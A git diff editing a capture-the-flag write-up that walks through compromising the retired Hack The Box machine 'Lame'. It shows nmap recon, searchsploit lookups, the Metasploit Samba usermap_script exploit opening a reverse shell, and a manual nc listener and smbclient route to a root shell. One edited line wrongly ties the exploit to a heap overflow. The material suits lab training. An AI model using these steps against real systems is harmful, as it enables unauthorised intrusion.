@@ -1,5 +1,5 @@
 ---
-title: "Hack The Box - Easy - Lame"
+title: "Walk-through of Lame from Hack The Box"
 toc: true
 toc_sticky: true
 excerpt_separator:  <!--more-->
@@ -13,17 +13,18 @@ tags:
   - Linux
 ---
 
-## Walk through of Lame from HTB
+## Machine Information
 
 ![Lame](/images/2020-04-05-21-43-26.png)
 
-Retired box, available here: [HTB - Easy - Lame](https://www.hackthebox.eu/home/machines/profile/1)
-
+This was the first machine released on the Hack The Box platform. It's now retired so only available to those with VIP membership here: [HTB - 001 - Easy - Lame](https://www.hackthebox.eu/home/machines/profile/1)
 <!--more-->
+
+### Initial Recon
 
 Check for open ports with Nmap:
 
-```code
+```text
 root@kali:~/htb/lame# nmap -sS -sC -sV -oA lame -p- -T4 10.10.10.3
 
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-16 22:10 BST
@@ -65,9 +66,11 @@ Host script results:
 
 Lots of ports open. Has port 21 open with anonymous FTP, but looking around there is nothing obvious.
 
+### Gaining Access
+
 Box is running vsftpd 2.3.4 so check searchsploit for vulnerability:
 
-```code
+```text
 root@kali:~/htb/lame# searchsploit vsftpd
 ---------------------------------------------------------------------------------
 vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption | exploits/linux/dos/5814.pl
@@ -80,7 +83,7 @@ vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)         | exploits/unix/r
 
 Last one in above list for backdoor execution looks good. Start Metasploit and load exploit:
 
-```code
+```text
 root@kali:~/htb/lame# msfconsole
 msf5 > search vsftpd 2.3.4
 msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
@@ -91,7 +94,7 @@ msf5 > exploit
 
 No luck, go back to list of services, now try samba on port 445:
 
-```code
+```text
 root@kali:~/htb/lame# searchsploit samba 3.0.20
 ---------------------------------------------------------------------------------
 Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) | exploits/unix/remote/16320.rb
@@ -99,9 +102,9 @@ Samba < 3.0.20 - Remote Heap Overflow                                           
 ---------------------------------------------------------------------------------
 ```
 
-Back in to metasploit:
+Remote heap overflow sounds promising, go back in to Metasploit and try it:
 
-```code
+```text
 root@kali:~/htb/lame# msfconsole
 msf5 > search samba 3.0.20
 msf5 > use exploit/multi/samba/usermap_script
@@ -122,18 +125,22 @@ msf5 > exploit
 [*] Command shell session 1 opened (10.10.14.14:4444 -> 10.10.10.3:35080) at 2019-07-16 22:18:10 +0100
 ```
 
-I have a shell, but need an interactive one:
+This works and I now have a reverse shell on to the box.
 
-```code
+### User and Root Flags
+
+I have a shell, but need an interactive one to make progress:
+
+```text
 msf5 > shell
 [*] Trying to find binary(python) on target machine
 [*] Found python at /usr/bin/python
 [*] Using `python` to pop up an interactive shell
 ```
 
-Now have interactive shell so get the flags:
+Now have interactive shell so get the user flag:
 
-```code
+```text
 # ls /home
 ftp  makis  service  user
 
@@ -146,15 +153,15 @@ user.txt
 
 ## Alternative Method (without MetaSploit)
 
-Start a Netcat session listening:
+Start a Netcat session listening on my Kali machine:
 
-```code
+```text
 root@kali:~/htb/lame# nc –lvp 4444
 ```
 
-Switch to another terminal:
+Switch to another terminal and use smbclient to connect:
 
-```code
+```text
 root@kali:~/htb/lame# smbclient //10.10.10.3/tmp
 Enter WORKGROUP\root's password:        <--- just press enter
 Anonymous login successful
@@ -165,7 +172,7 @@ Password:                               <--- just press enter
 
 Switch back to Netcat terminal and should have root shell:
 
-```code
+```text
 # id
 uid=0(root) gid=0(root)
 ```
